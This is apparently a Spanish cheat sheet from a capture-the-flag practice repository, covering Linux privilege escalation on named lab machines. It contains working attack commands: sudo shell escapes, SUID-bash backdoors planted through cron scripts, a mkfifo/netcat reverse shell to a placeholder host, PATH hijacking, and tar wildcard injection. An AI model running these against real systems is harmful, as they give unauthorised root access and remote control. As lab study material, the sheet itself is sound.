# Escalada de privilegios Linux

Técnicas usadas en **CACHOPO**, **ACEITUNO**, **Academia**, **GOIKO**, **BOLA**, **Domino** y **Monitor silencioso**.

## 1. Punto de partida: enumeración

```
id
hostname
uname -a
cat /etc/os-release
sudo -l
find / -perm -4000 -type f 2>/dev/null      # binarios con SUID
ls -la /opt /var/backups /tmp
```

`sudo -l` es lo primero: lista qué binarios puedes ejecutar sin contraseña.

## 2. GTFOBins (abuso de binarios con sudo/SUID)

Buscar el binario en [https://gtfobins.github.io](https://gtfobins.github.io) y copiar el comando. Ejemplos usados en el repo:

**node:**

```
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

**crash (SUID):**

```
sudo /usr/bin/crash -h
```

**most (lectura de archivos como root):**

```
sudo -u root /usr/bin/most /root/root.txt
```

Dentro de `most` se lanza un shell con `!` y se sale con `q`.

## 3. Shell SUID en bash

```
echo "chmod +s /bin/bash" >> /opt/backup.sh
chmod +x /opt/backup.sh
```

Esperar a que el cron ejecute el script y comprobar:

```
ls -l /bin/bash
/bin/bash -p
```

- `-p` → mantiene los privilegios efectivos aunque el binario sea SUID.

## 4. Vigilar procesos con pspy

Muestra los procesos de otros usuarios (cron, systemd) sin necesidad de root:

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

Útil para descubrir un script periódico escribible.

Si el script del cron es **writable por nuestro grupo** (en **Domino**: `-rwxrwxr-- root devops`), sobrescribirlo directamente con el payload y esperar a la siguiente ejecución:

```
# payload en /opt/monitoring/health_report.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_LOCAL> <PUERTO> >/tmp/f
```

Comprobar permisos antes de tocar nada:

```
ls -la /opt/monitoring/health_report.sh
```

## 5. Credenciales reutilizadas (`su`)

Las contraseñas encontradas en ficheros de configuración o vaults suelen reutilizarse en otras cuentas del mismo sistema:

```
su <usuario>
# contraseña encontrada en la configuración
cat user.txt
```

Ejemplos del repo:

- **Domino**: la contraseña de `config.php` (`D3v0ps!2024`) servía también para el usuario `devops`.
- **Monitor silencioso**: password de `secret.config` → SSH como `sysadmin`; password del vault KeePass → `su root`.

> Ojo: el usuario de un servicio web (`www-data`) normalmente **no** puede usar `su`; en ese caso reconéctate por SSH con esas credenciales.

## 6. Hijack del PATH

Si un script de `sudo` ejecuta un binario sin ruta absoluta (`find`, `ls`...), creamos uno falso en un directorio que controlamos:

```
echo "/bin/bash" > find
chmod 777 find
echo $PATH
```

Y ejecutamos el script forzando el PATH:

```
sudo PATH=/ruta/controlada:$PATH /ruta/controlada/script.sh
```

## 7. Wildcard injection en `tar` (cron como root)

Cuando un cron de root ejecuta `tar czf ... *` en un directorio escribible, los nombres de fichero se convierten en argumentos de `tar` (patrón de **Operation Coldstart**):

```
cd /DIRECTORIO_DEL_CRON
echo 'chmod +s /bin/bash' > payload.sh
chmod +x payload.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh payload.sh'
```

Esperar a que el cron corra (~1 minuto) y comprobar:

```
/bin/bash -p
id          # uid=webdev ... euid=0(root)
```

- `--checkpoint=1` + `--checkpoint-action=exec=sh ...` → `tar` ejecuta el script **como root** al expandir el comodín `*`.
- `touch --` con el `--` **separado** del nombre: si no, se fusionan y sale `touch: unrecognized option '---checkpoint=1'`.
- Rutas **absolutas** en el payload: el cron hace `cd` al directorio antes de lanzar `tar`.
- El usuario real sigue siendo el nuestro, pero el **euid es 0**; por eso se lanza `bash -p` (preserva el privilegio).

## 8. Bases de datos locales

```
mysql -u <usuario> -p -h localhost <basededatos>
mariadb -u <usuario> -p
```

Dentro del cliente SQL:

```
show databases;
use <basededatos>;
show tables;
select * from <tabla>;
```

## 9. Recoger las banderas

```
cat user.txt
cat root.txt
find / -name "user.txt" -o -name "root.txt" 2>/dev/null
```
